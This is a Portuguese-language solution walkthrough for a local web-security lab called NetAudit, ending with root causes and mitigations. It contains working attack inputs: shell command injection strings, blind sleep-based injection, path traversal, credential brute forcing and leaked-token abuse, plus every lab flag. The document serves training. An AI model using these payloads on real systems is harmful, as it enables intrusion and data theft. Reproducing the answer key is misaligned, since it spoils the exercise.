# Solution - Lab 03 NetAudit

Gabarito tecnico completo. Use apenas no ambiente local autorizado:

```text
http://127.0.0.1:8090
```

## 0. Descoberta pre-login por debug disclosure

Fluxo:

1. Capture um `POST /api/auth/login`.
2. Modifique `returnUrl` para `"'"`.
3. Receba `HTTP 500` com stack trace controlado.
4. O erro expoe `/old/deployment-notes.txt` e `/backup/readme.txt`.
5. Leia as notas antigas, as listas candidatas e use Intruder.
6. A combinacao valida e `analyst:analyst123`.
7. `deployment-notes.txt` aponta para `access-review.txt`.

Payload:

```json
{
  "username": "x",
  "password": "x",
  "client": "web",
  "returnUrl": "'"
}
```

Intruder:

1. Payload set 1 no `username`.
2. Payload set 2 no `password`.
3. Ataque `Cluster Bomb`.
4. `user-candidates.txt` no set 1.
5. `password-candidates.txt` no set 2.
6. Identificar a resposta `200`, maior e com `Login successful`.

Flag:

```text
GET /old/access-review.txt
FLAG{pre_auth_debug_disclosure_lab3}
```

## Payloads principais

```text
returnUrl = '
target = 127.0.0.1; whoami
target = 127.0.0.1; pwd
target = 127.0.0.1; ls -la
target = 127.0.0.1; ls -la /app
target = 127.0.0.1; ls -la /app/flags
target = 127.0.0.1; cat /app/flags/flag1.txt
tcp target = 127.0.0.1; sleep 5; #
tcp target = 127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
resolver target = internal-metadata
file = ../flags/flag4.txt
includeFile = data/backup-manifest.log
includeFile = flags/root.txt
```

Uma enumeracao mais agressiva como `find /app -maxdepth 3 -type f 2>/dev/null` tambem funciona na Command Injection com output, mas pode revelar artefatos de etapas futuras e por isso nao e o caminho didatico recomendado no walkthrough.

## Login

```bash
curl -s -c cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"analyst","password":"analyst123","returnUrl":"/dashboard.html"}' \
  http://127.0.0.1:8090/api/auth/login
```

## 1. Request Tampering e Command Injection com output

Rota:

```text
POST /api/assets/check
```

Body normal:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "gateway.local"
}
```

O backend concatena `target` no comando de ping. A UI nao permite editar `target`, mas o Burp permite.

Prova de execucao:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "127.0.0.1; whoami"
}
```

Enumeracao:

```text
127.0.0.1; pwd
127.0.0.1; ls -la
127.0.0.1; ls -la /app
127.0.0.1; ls -la /app/flags
```

Flag:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "127.0.0.1; cat /app/flags/flag1.txt"
}
```

```text
FLAG{command_injection_ping_lab3}
```

## 2. Blind/Time-Based Command Injection em agente separado

Descoberta:

```js
const legacyAgentTcpProbeEndpoint = "/api/agents/tcp-probe";
```

Rota:

```text
POST /api/agents/tcp-probe
```

Body normal:

```json
{
  "target": "127.0.0.1",
  "port": "80"
}
```

Payload por tempo:

```json
{
  "target": "127.0.0.1; sleep 5; #",
  "port": "80"
}
```

A resposta nao retorna stdout/stderr. Ela contem apenas:

```text
ok, status, target, port, durationMs
```

Payload com efeito colateral seguro:

```json
{
  "target": "127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #",
  "port": "80"
}
```

Depois:

```text
GET /reports/tcp-proof.txt
```

```text
FLAG{blind_time_based_command_injection_lab3}
```

## 3. Hidden endpoint discovery e metadata disclosure

Descoberta no JS:

```js
const legacyResolverEndpoint = "/api/assets/resolve";
const legacyResolverPayloadShape = { target: "hostname" };
```

Rota:

```text
POST /api/assets/resolve
```

Body normal:

```json
{
  "target": "dns01.local"
}
```

Resposta normal:

```json
{
  "ok": true,
  "target": "dns01.local",
  "resolved": "10.10.0.53",
  "metadata": {
    "owner": "netops",
    "environment": "internal",
    "resolver": "legacy"
  }
}
```

`app.log` entrega a pista:

```text
[debug] legacy resolver still accepts internal metadata target for support checks
```

Body de flag:

```json
{
  "target": "internal-metadata"
}
```

Resposta:

```json
{
  "ok": true,
  "target": "internal-metadata",
  "metadata": {
    "note": "legacy resolver metadata should not be exposed",
    "flag": "FLAG{hidden_resolver_metadata_disclosure_lab3}"
  }
}
```

## 4. Support logs e Path Traversal

`support.html` chama:

```text
GET /api/support/log?file=app.log
```

`app.log` aponta para:

```text
[debug] archived incident review details moved to audit.log
```

`audit.log` contem:

```text
[review] incident evidence moved outside data directory
[review] evidence relative hint: flags/flag4.txt
[review] log viewer base directory: /app/data
```

Como a base e `/app/data`, o payload:

```text
file=../flags/flag4.txt
```

resolve para `/app/flags/flag4.txt`.

Flag:

```text
FLAG{path_traversal_log_viewer_lab3}
```

## 5. Internal health, token vazado e diagnostics

Token montado a partir do log:

```text
netaudit-debug-2026
```

Sem header:

```text
GET /api/internal/health -> 403
```

Com header:

```bash
curl -s \
  -H "X-Support-Token: netaudit-debug-2026" \
  http://127.0.0.1:8090/api/internal/health
```

Resposta:

```json
{
  "status": "healthy",
  "service": "NetAudit",
  "environment": "production",
  "diagnosticEndpoint": "/api/internal/diagnostics",
  "backupEndpoint": "/api/internal/backup",
  "backupMethod": "POST",
  "requiredParameter": "includeFile"
}
```

Diagnostics:

```bash
curl -s \
  -H "X-Support-Token: netaudit-debug-2026" \
  http://127.0.0.1:8090/api/internal/diagnostics
```

Resposta:

```json
{
  "status": "diagnostics_ready",
  "flag": "FLAG{internal_diagnostics_token_abuse_lab3}",
  "backupManifest": "/app/data/backup-manifest.log"
}
```

## 6. Backup interno com Arbitrary File Read

Rota:

```text
POST /api/internal/backup
```

Body normal:

```json
{
  "includeFile": "data/app.log"
}
```

Manifesto indicado por diagnostics:

```json
{
  "includeFile": "data/backup-manifest.log"
}
```

Conteudo importante:

```text
[backup] export service accepts includeFile
[backup] approved examples: data/app.log, data/audit.log
[backup] final proof file: flags/root.txt
```

Leitura arbitraria final:

```json
{
  "includeFile": "flags/root.txt"
}
```

Flag:

```text
FLAG{admin_backup_arbitrary_file_read_lab3}
```

## Causas raiz e mitigacoes

- stack trace detalhado em producao;
- artefatos legados publicados no webroot;
- credenciais descobriveis por exposicao operacional;
- concatenacao em shell em endpoints de probe;
- metadata interna exposta por endpoint legado;
- viewer de logs com path traversal;
- token interno vazado em logs;
- backup administrativo com arbitrary file read.

Mitigacoes:

- respostas de erro genericas;
- segredos fora do webroot;
- rotacao de credenciais expostas;
- `execFile` ou `spawn` com argumentos separados;
- allowlists estritas de target e port;
- nao expor metadata sensivel;
- validar caminhos resolvidos contra base permitida;
- remover tokens estaticos vazados em logs;
- aplicar autorizacao real em endpoints internos.

## Lista de flags

```text
FLAG{pre_auth_debug_disclosure_lab3}
FLAG{command_injection_ping_lab3}
FLAG{blind_time_based_command_injection_lab3}
FLAG{hidden_resolver_metadata_disclosure_lab3}
FLAG{path_traversal_log_viewer_lab3}
FLAG{internal_diagnostics_token_abuse_lab3}
FLAG{admin_backup_arbitrary_file_read_lab3}
```
